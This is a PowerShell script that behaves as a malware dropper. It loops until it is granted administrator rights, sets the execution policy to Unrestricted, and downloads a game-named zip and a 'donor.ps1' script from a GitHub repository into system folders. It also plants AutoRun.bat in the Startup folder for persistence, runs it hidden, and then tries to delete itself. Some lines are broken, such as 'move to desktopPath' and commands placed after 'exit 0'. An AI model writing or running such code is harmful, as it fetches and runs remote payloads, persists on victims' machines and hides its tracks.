
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}

Set-ExecutionPolicy Unrestricted -Force
$scriptPath = $MyInvocation.MyCommand.Path

Set-Variable -Name textPath -Value ("$env:TEMP")
Set-Variable -Name zipFilePath -Value ("$env:TEMP")
Set-Variable -Name donor -Value ("C:\ProgramData\Microsoft\Windows")
Set-Variable -Name Autorun -Value ("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
Set-Variable -Name zipUrl -Value ("https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/AssassinsCreed_SE.zip")
Set-Variable -Name donorUrl -Value ("https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/p_vba.ps1")
Set-Variable -Name AutorunUrl -Value ("https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/AutoRun.bat")

Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
function Test-IsAdmin {
    Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

Set-Content -Value "Permissions Granted" -Path "$textPath\perm.txt"

powershell -windowstyle hidden Invoke-WebRequest -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl

Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath

move to desktopPath

powershell -windowstyle hidden Invoke-WebRequest -OutFile "$donor\donor.ps1" -Uri $donorUrl

powershell -windowstyle hidden Invoke-WebRequest -OutFile "$Autorun\AutoRun.bat" -Uri $AutorunUrl

Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$Autorun\AutoRun.bat`"" -NoNewWindow

Start-Sleep -Seconds 240

exit 0

Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
Remove-Item -Path $scriptPath -Force
